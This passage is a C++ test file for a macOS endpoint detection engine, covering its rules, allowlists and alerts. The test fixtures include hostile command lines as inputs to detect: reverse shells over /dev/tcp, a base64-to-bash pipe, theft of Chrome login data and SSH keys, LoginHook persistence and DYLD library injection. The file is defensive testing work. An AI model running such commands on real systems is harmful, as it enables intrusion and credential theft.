        {"id":"r.off","title":"off","event":"exec","score":200,"enabled":false,"when":{"name_any":["x"]}},
        {"id":"r.unsigned","title":"u","event":"exec","score":200,"when":{"name_any":["y"],"unsigned_process":true}}]})",
                            rs, nullptr));
    Engine e(rs);
    CHECK(feed(e, R"({"type":"exec","time_ms":0,"pid":160,"ppid":1,"path":"/tmp/x","args":["x"],"signing":"unsigned"})").empty());
    // signing unknown must not count as unsigned
    CHECK(feed(e, R"({"type":"exec","time_ms":0,"pid":161,"ppid":1,"path":"/tmp/y","args":["y"]})").empty());
    CHECK(feed(e, R"({"type":"exec","time_ms":0,"pid":162,"ppid":1,"path":"/tmp/y","args":["y"],"signing":"unsigned"})").size() == 1);
}

TEST(engine_ignores_malformed_events_safely) {
    Engine e(default_ruleset());
    Event ev;
    ev.type = EventType::NetConnect;
    ev.proc.pid = 0;
    CHECK(e.process(ev).empty());
    ev.type = EventType::Fork;
    CHECK(e.process(ev).empty());
    ev.type = EventType::Exit;
    ev.proc.pid = 999;
    CHECK(e.process(ev).empty());
    ev.type = EventType::FileCreate;
    ev.proc.pid = 5;
    ev.file_path.clear();
    CHECK(e.process(ev).empty());
}

TEST(alert_serialization) {
    Engine e(default_ruleset());
    const auto alerts = feed_all(e, kChain);
    CHECK(!alerts.empty());
    const std::string js = alert_to_json(alerts.back());
    const auto doc = json::parse(js);
    CHECK(doc.has_value());
    CHECK((*doc)["level"].as_int() >= 1);
    CHECK((*doc)["rules"].is_array());
    CHECK(!(*doc)["title"].as_string().empty());
    CHECK(alert_to_text(alerts.back()).find("이벤트") != std::string::npos);

    Alert a;
    a.process_path = "/tmp/we\"ird\\path\n";
    a.title = "t";
    const auto d2 = json::parse(alert_to_json(a));
    CHECK(d2.has_value());
    CHECK((*d2)["process"].as_string() == a.process_path);
}

TEST(engine_net_conditions_public_and_port) {
    RuleSet rs;
    CHECK(load_ruleset_text(R"({"rules":[
        {"id":"r.pub","title":"p","event":"net","score":10,"when":{"remote_public":true}},
        {"id":"r.priv","title":"q","event":"net","score":20,"when":{"remote_public":false}},
        {"id":"r.port","title":"r","event":"net","score":30,"when":{"port_any":[4444,5555]}},
        {"id":"r.notport","title":"s","event":"net","score":40,"when":{"port_not_any":[80,443]}}]})",
                            rs, nullptr));
    Engine e(rs);
    feed(e, R"({"type":"exec","time_ms":0,"pid":170,"ppid":1,"path":"/opt/a","args":["a"]})");
    feed(e, R"({"type":"net","time_ms":1,"pid":170,"path":"/opt/a","remote_ip":"192.168.1.1","remote_port":443})");
    const ProcNode* n = e.tree().find(170);
    CHECK(n->hit_ids.count("r.priv") == 1);
    CHECK(n->hit_ids.count("r.pub") == 0);
    CHECK(n->hit_ids.count("r.port") == 0);
    CHECK(n->hit_ids.count("r.notport") == 0);

    feed(e, R"({"type":"exec","time_ms":0,"pid":171,"ppid":1,"path":"/opt/a","args":["a"]})");
    feed(e, R"({"type":"net","time_ms":1,"pid":171,"path":"/opt/a","remote_ip":"8.8.4.4","remote_port":4444})");
    n = e.tree().find(171);
    CHECK(n->hit_ids.count("r.pub") == 1);
    CHECK(n->hit_ids.count("r.priv") == 0);
    CHECK(n->hit_ids.count("r.port") == 1);
    CHECK(n->hit_ids.count("r.notport") == 1);
}

namespace {

bool hit(Engine& e, int pid, const std::string& id) {
    const ProcNode* n = e.tree().find(pid);
    return n != nullptr && n->hit_ids.count(id) != 0;
}

std::string exec_line(int pid, int ppid, const std::string& path, const std::string& args_json,
                      const std::string& signing, long long t, const std::string& env_json = "") {
    std::string s = R"({"type":"exec","time_ms":)" + std::to_string(t) + R"(,"pid":)" + std::to_string(pid) +
                    R"(,"ppid":)" + std::to_string(ppid) + R"(,"path":")" + path + R"(","args":)" + args_json +
                    R"(,"signing":")" + signing + R"(")";
    if (!env_json.empty()) s += R"(,"env":)" + env_json;
    return s + "}";
}

RuleSet default_plus(const char* overlay_json) {
    RuleSet rs = default_ruleset();
    RuleSet overlay;
    std::string err;
    const bool ok = load_ruleset_text(overlay_json, overlay, &err);
    CHECK(ok);
    if (!ok) return rs;
    merge_ruleset(rs, overlay);
    return rs;
}

}

TEST(parser_keeps_only_dyld_environment) {
    const ParseResult r = parse_event_line(
        R"({"event":{"exec":{"target":{"audit_token":{"pid":900},"ppid":1,"executable":{"path":"/tmp/inj"},)"
        R"("signing_id":"","team_id":"","is_platform_binary":false,"codesigning_flags":2},"args":["/tmp/inj"],)"
        R"("env":["PATH=/usr/bin","DYLD_INSERT_LIBRARIES=/tmp/evil.dylib","SECRET=abc"]}},)"
        R"("time":"2026-11-06T00:00:00.000Z"})");
    CHECK(r.ok());
    CHECK(r.event.proc.env.size() == 1);
    if (!r.event.proc.env.empty()) CHECK(r.event.proc.env[0] == "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib");

    const ParseResult n = parse_event_line(exec_line(901, 1, "/opt/a", R"(["a"])", "unsigned", 5,
                                                     R"(["HOME=/x","DYLD_FORCE_FLAT_NAMESPACE=1"])"));
    CHECK(n.ok());
    CHECK(n.event.proc.env.size() == 1);
}

TEST(rule_dyld_insert) {
    Engine e(default_ruleset());
    const auto a = feed(e, exec_line(910, 1, "/tmp/inj", R"(["/tmp/inj"])", "unsigned", 1000,
                                     R"(["DYLD_INSERT_LIBRARIES=/tmp/evil.dylib"])"));
    CHECK(a.size() == 1);
    if (a.size() == 1) {
        CHECK(has_rule(a[0], "mac.exec.dyld_insert"));
        CHECK(has_rule(a[0], "mac.exec.unsigned_from_tmp"));
        CHECK(a[0].score == 80);
    }
    // Same environment on its own is only a 40 point signal.
    const auto b = feed(e, exec_line(911, 1, "/usr/bin/true", R"(["true"])", "platform", 2000,
                                     R"(["DYLD_INSERT_LIBRARIES=/Applications/Xcode.app/x.dylib"])"));
    CHECK(b.empty());
    CHECK(hit(e, 911, "mac.exec.dyld_insert"));
    // Without the variable nothing fires.
    feed(e, exec_line(912, 1, "/usr/bin/true", R"(["true"])", "platform", 3000));
    CHECK(!hit(e, 912, "mac.exec.dyld_insert"));
}

TEST(rules_credential_login_hook_base64_jxa) {
    Engine e(default_ruleset());
    feed(e, exec_line(920, 1, "/bin/zsh", R"(["zsh"])", "platform", 1000));
    feed(e, exec_line(921, 920, "/bin/cp",
                      R"(["cp","/Users/a/Library/Application Support/Google/Chrome/Default/Login Data","/tmp/l"])",
                      "platform", 2000));
    CHECK(hit(e, 921, "mac.exec.browser_data_access"));
    feed(e, exec_line(922, 920, "/bin/cat", R"(["cat","/Users/a/.ssh/id_ed25519"])", "platform", 3000));
    CHECK(hit(e, 922, "mac.exec.ssh_key_access"));
    feed(e, exec_line(923, 920, "/usr/bin/defaults",
                      R"(["defaults","write","com.apple.loginwindow","LoginHook","/tmp/x.sh"])", "platform", 4000));
    CHECK(hit(e, 923, "mac.exec.login_hook"));
    feed(e, exec_line(924, 920, "/bin/bash", R"(["bash","-c","echo aGk= | base64 -d | bash"])", "platform", 5000));
    CHECK(hit(e, 924, "mac.exec.base64_shell"));
    feed(e, exec_line(925, 920, "/usr/bin/osascript", R"(["osascript","-l","JavaScript","-e","1"])", "platform", 6000));
    CHECK(hit(e, 925, "mac.exec.jxa"));

    // Harmless look-alikes.
    feed(e, exec_line(926, 920, "/bin/cat", R"(["cat","/Users/a/notes.txt"])", "platform", 7000));
    CHECK(!hit(e, 926, "mac.exec.ssh_key_access"));
    feed(e, exec_line(927, 920, "/bin/bash", R"(["bash","-c","echo hi | base64"])", "platform", 8000));
    CHECK(!hit(e, 927, "mac.exec.base64_shell"));
}

TEST(rules_file_app_bundle_and_authorized_keys) {
    Engine e(default_ruleset());
    feed(e, exec_line(930, 1, "/opt/dropper", R"(["dropper"])", "unsigned", 1000));
    feed(e, R"({"type":"file_modify","time_ms":2000,"pid":930,"path":"/opt/dropper","file":"/Applications/Foo.app/Contents/MacOS/Foo","signing":"unsigned"})");
    CHECK(hit(e, 930, "mac.file.app_bundle_tamper"));

    feed(e, exec_line(931, 1, "/Applications/Updater.app/Contents/MacOS/u", R"(["u"])", "team:ABCDE12345", 3000));
    feed(e, R"({"type":"file_modify","time_ms":4000,"pid":931,"path":"/Applications/Updater.app/Contents/MacOS/u","file":"/Applications/Foo.app/Contents/MacOS/Foo","signing":"team:ABCDE12345"})");
    CHECK(!hit(e, 931, "mac.file.app_bundle_tamper"));

    feed(e, exec_line(932, 1, "/usr/bin/curl", R"(["curl","x"])", "platform", 5000));
    feed(e, R"({"type":"file_modify","time_ms":6000,"pid":932,"path":"/usr/bin/curl","file":"/Users/a/.ssh/authorized_keys","signing":"platform"})");
    CHECK(hit(e, 932, "mac.persist.authorized_keys_script"));
}

TEST(allowlist_validation) {
    RuleSet rs;
    std::string err;
    CHECK(!load_ruleset_text(R"({"allowlist":[{"id":"x"}]})", rs, &err));
    CHECK(err.find("allow everything") != std::string::npos);
    CHECK(!load_ruleset_text(R"({"allowlist":[{"id":"x","rules":["a"],"bogus":1}]})", rs, &err));
    CHECK(err.find("unknown key") != std::string::npos);
    CHECK(!load_ruleset_text(R"({"allowlist":[{"id":"x","rules":["a"]},{"id":"x","rules":["b"]}]})", rs, &err));
    CHECK(err.find("duplicate") != std::string::npos);
    CHECK(!load_ruleset_text(R"({"allowlist":[{"id":"x","when":{"requires_tag_any":["staged"]}}]})", rs, &err));
    CHECK(!load_ruleset_text(R"({"allowlist":[{"id":"x","event":"smtp","rules":["a"]}]})", rs, &err));
    CHECK(!load_ruleset_text(R"({"allowlist":{}})", rs, &err));
    CHECK(load_ruleset_text(R"({"allowlist":[{"rules":["a.*"]},{"event":"net"},{"when":{"team_id_any":["ABC"]}}]})",
                            rs, &err));
    CHECK(rs.allowlist.size() == 3);
    CHECK(rs.allowlist[0].id == "allow#1");
    CHECK(rs.allowlist[2].when.team_id_any.size() == 1 && rs.allowlist[2].when.team_id_any[0] == "abc");
}

TEST(allowlist_suppresses_matching_hits_only) {
    const char* kOverlay = R"({"allowlist":[
        {"id":"corp-tool","note":"internal helper","rules":["mac.exec.reverse_shell_args"],
         "when":{"path_prefix_any":["/opt/corp/"]}}]})";
    Engine plain(default_ruleset());
    Engine e(default_plus(kOverlay));
    const std::string args = R"(["sh","-c","exec 3<>/dev/tcp/10.0.0.1/80"])";

    CHECK(feed(plain, exec_line(940, 1, "/opt/corp/tool", args, "unsigned", 1000)).size() == 1);

    CHECK(feed(e, exec_line(940, 1, "/opt/corp/tool", args, "unsigned", 1000)).empty());
    CHECK(e.suppressed() == 1);
    CHECK(!hit(e, 940, "mac.exec.reverse_shell_args"));
    CHECK(e.tree().find(940)->score == 0);

    const auto other = feed(e, exec_line(941, 1, "/opt/other/tool", args, "unsigned", 2000));
    CHECK(other.size() == 1);
    CHECK(e.suppressed() == 1);
}

TEST(allowlist_prefix_patterns_team_id_and_hosts) {
    const char* kOverlay = R"({"rules":[
        {"id":"mac.net.test_any","title":"any public connect","event":"net","score":10,"when":{"remote_public":true}}],
        "allowlist":[
        {"id":"vendor","rules":["mac.net.*"],"when":{"team_id_any":["ABCDE12345"]}},
        {"id":"corp-hosts","event":"net","when":{"remote_host_any":["*.corp.example"],"name_any":["bash"]}},
        {"id":"lab-range","rules":["mac.net.shell_connect"],"when":{"remote_ip_any":["198.51.100.0/24"]}}]})";
    Engine e(default_plus(kOverlay));

    // Signed vendor app: every mac.net.* rule is skipped.
    feed(e, exec_line(950, 1, "/opt/vendor/agent", R"(["agent"])", "team:ABCDE12345", 1000));
    feed(e, R"({"type":"net","time_ms":2000,"pid":950,"path":"/opt/vendor/agent","remote_ip":"203.0.113.9","remote_port":4444,"signing":"team:ABCDE12345"})");
    CHECK(e.tree().find(950)->score == 0);
    CHECK(e.suppressed() >= 1);

    // Same traffic from an unsigned binary is not covered.
    feed(e, exec_line(951, 1, "/tmp/agent", R"(["agent"])", "unsigned", 3000));
    feed(e, R"({"type":"net","time_ms":4000,"pid":951,"path":"/tmp/agent","remote_ip":"203.0.113.9","remote_port":4444,"signing":"unsigned"})");
    CHECK(e.tree().find(951)->score > 0);

    // bash to an allowed host pattern vs. another host.
    feed(e, exec_line(952, 1, "/bin/bash", R"(["bash"])", "platform", 5000));
    feed(e, R"({"type":"net","time_ms":6000,"pid":952,"path":"/bin/bash","remote_ip":"203.0.113.9","remote_port":22,"remote_host":"git.corp.example","signing":"platform"})");
    CHECK(!hit(e, 952, "mac.net.shell_connect"));
    feed(e, exec_line(953, 1, "/bin/bash", R"(["bash"])", "platform", 7000));
    feed(e, R"({"type":"net","time_ms":8000,"pid":953,"path":"/bin/bash","remote_ip":"203.0.113.9","remote_port":22,"remote_host":"evil.example","signing":"platform"})");
    CHECK(hit(e, 953, "mac.net.shell_connect"));

    // CIDR on remote_ip_any (only the named rule is skipped).
    feed(e, exec_line(954, 1, "/bin/bash", R"(["bash"])", "platform", 9000));
    feed(e, R"({"type":"net","time_ms":10000,"pid":954,"path":"/bin/bash","remote_ip":"198.51.100.7","remote_port":22,"signing":"platform"})");
    CHECK(!hit(e, 954, "mac.net.shell_connect"));
}

TEST(allowlist_merge_appends_overlay_entries) {
    RuleSet base = default_ruleset();
    CHECK(base.allowlist.empty());
    RuleSet a, b;
    CHECK(load_ruleset_text(R"({"allowlist":[{"id":"one","rules":["x"]}]})", a, nullptr));
    CHECK(load_ruleset_text(R"({"allowlist":[{"id":"two","rules":["y"]}]})", b, nullptr));
    merge_ruleset(base, a);
    merge_ruleset(base, b);
    CHECK(base.allowlist.size() == 2);
}

TEST(alert_has_recent_activity_and_suspect_files) {
    Engine e(default_ruleset());
    const auto alerts = feed_all(e, kChain);
    CHECK(!alerts.empty());
    const Alert& last = alerts.back();
    CHECK(!last.context.empty());
    CHECK(last.context.size() <= 12);
    CHECK(last.context.back().rfind("T+0.0s", 0) == 0);
    bool saw_exec = false;
    for (const std::string& c : last.context) {
        if (c.find("exec /tmp/.x") != std::string::npos) saw_exec = true;
    }
    CHECK(saw_exec);
    CHECK(std::find(last.suspect_paths.begin(), last.suspect_paths.end(), "/tmp/.x") != last.suspect_paths.end());
    CHECK(last.suspect_paths.size() <= 4);

    // Activity of unrelated processes must not leak into the context.
    Engine e2(default_ruleset());
    feed(e2, exec_line(960, 1, "/usr/bin/vim", R"(["vim"])", "platform", 100));
    feed(e2, exec_line(961, 1, "/bin/zsh", R"(["zsh"])", "platform", 200));
    const auto a2 = feed(e2, exec_line(962, 961, "/bin/bash", R"(["bash","-c","bash -i >& /dev/tcp/1.2.3.4/9 0>&1"])",
                                       "platform", 300));
    CHECK(a2.size() == 1);
    if (a2.size() == 1) {
        for (const std::string& c : a2[0].context) CHECK(c.find("vim") == std::string::npos);
    }
}

TEST(alert_tsv_keeps_context_files_and_reads_old_lines) {
    Alert a;
    a.time_ms = 1000;
    a.level = 2;
    a.score = 120;
    a.pid = 7;
    a.process_path = "/tmp/x";
    a.title = "t";
    a.detail = "d";
    a.context = {"T-1.0s  a(1)  exec /bin/a", "T+0.0s  b(2)  create /tmp/y"};
    a.files = {"/tmp/x  sha256:abc  1.0 KB  이상 없음"};
    const std::string line = alert_to_tsv(a);
    Alert b;
    CHECK(alert_from_tsv(line, b));
    CHECK(b.context == a.context);
    CHECK(b.files == a.files);

    // 10-field lines written by older versions still load.
    const std::string old_line = line.substr(0, line.rfind('\t', line.rfind('\t') - 1));
    Alert c;
    CHECK(alert_from_tsv(old_line, c));
    CHECK(c.context.empty() && c.files.empty());
    CHECK(c.title == "t");

    const auto doc = json::parse(alert_to_json(a));
    CHECK(doc.has_value());
    CHECK((*doc)["context"].items().size() == 2);
    CHECK((*doc)["files"].items().size() == 1);
}

TEST(engine_seed_process_keeps_signing_and_ancestry) {
    Engine e(default_ruleset());
    ProcessRef sh;
    sh.pid = 970;
    sh.ppid = 1;
    sh.path = "/tmp/old_implant";
    sh.sig_known = true;  // unsigned: no team id, not platform
    e.seed_process(sh, 100);
    CHECK(e.seeded() == 1);
    const ProcNode* n = e.tree().find(970);
    CHECK(n != nullptr && n->is_unsigned());
    CHECK(e.events_processed() == 0);  // seeding evaluates nothing

    // A later event that only knows the pid must not erase what the snapshot learned.
    feed(e, R"({"type":"net","time_ms":200,"pid":970,"path":"/tmp/old_implant","remote_ip":"203.0.113.9","remote_port":4444})");
    n = e.tree().find(970);
    CHECK(n != nullptr && n->sig_known && n->is_unsigned());
    CHECK(hit(e, 970, "mac.net.unsigned_public"));
    CHECK(hit(e, 970, "mac.net.unsigned_uncommon_port"));

    // Its children are tracked under it.
    feed(e, exec_line(971, 970, "/bin/sh", R"(["sh"])", "platform", 300));
    const auto chain = e.tree().chain(971);
    CHECK(chain.size() >= 2);
    if (chain.size() >= 2) CHECK(chain[1]->pid == 970);
    CHECK(e.tree().find(971)->score >= 35);  // inherited from the seeded parent's later hits
}
